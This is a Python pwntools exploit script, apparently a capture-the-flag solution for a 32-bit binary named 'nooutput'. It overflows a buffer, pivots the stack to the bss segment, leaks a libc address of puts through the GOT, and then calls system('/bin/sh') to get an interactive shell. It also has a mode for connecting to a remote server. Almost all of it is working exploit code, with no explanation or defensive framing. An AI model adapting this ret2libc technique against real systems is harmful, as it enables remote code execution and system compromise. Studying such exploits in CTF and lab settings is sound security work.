#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'nooutput'
libc_path = './libc.so.6'
libc_path = '/usr/lib32/libc-2.32.so'


# remote server ip and port
server_ip = "0.0.0.0"
server_port = 0

# if local debug
LOCAL = 1
LIBC  = 1
#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	leave = 0x08048514
	read = 0x080484F9
	bss = elf.bss() + 0x800
	li('bss: ' + hex(bss))
	p = b'A' * 0x100
	p += p32(bss)
	p += p32(read)
	s(p)
	

	p =  p32(bss) # ebp
	p += p32(elf.plt['puts'])
	p += p32(read)
	p += p32(elf.got['puts'])
	p = p.ljust(0x100, b'\x00')
	p += p32(bss - 0x100)
	p += p32(leave)
	s(p)

	leak = u32(ru('\xf7')[-3:] + b'\xf7')
	libc_base = leak - libc.sym['puts']
	system = libc_base + libc.sym['system']
	str_bin_sh = libc_base + 0x195108
	li('libc_base: ' + hex(libc_base))
	li('system   : ' + hex(system))
	li('/bin/sh  : ' + hex(str_bin_sh))

	#db()
	p =  p32(bss) # ebp
	p += p32(system)
	p += p32(str_bin_sh)
	#p += p32(read)
	p += p32(str_bin_sh)
	p = p.ljust(0x100, b'\x00')
	p += p32(bss - 0x100)
	p += p32(leave)
	s(p)


def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
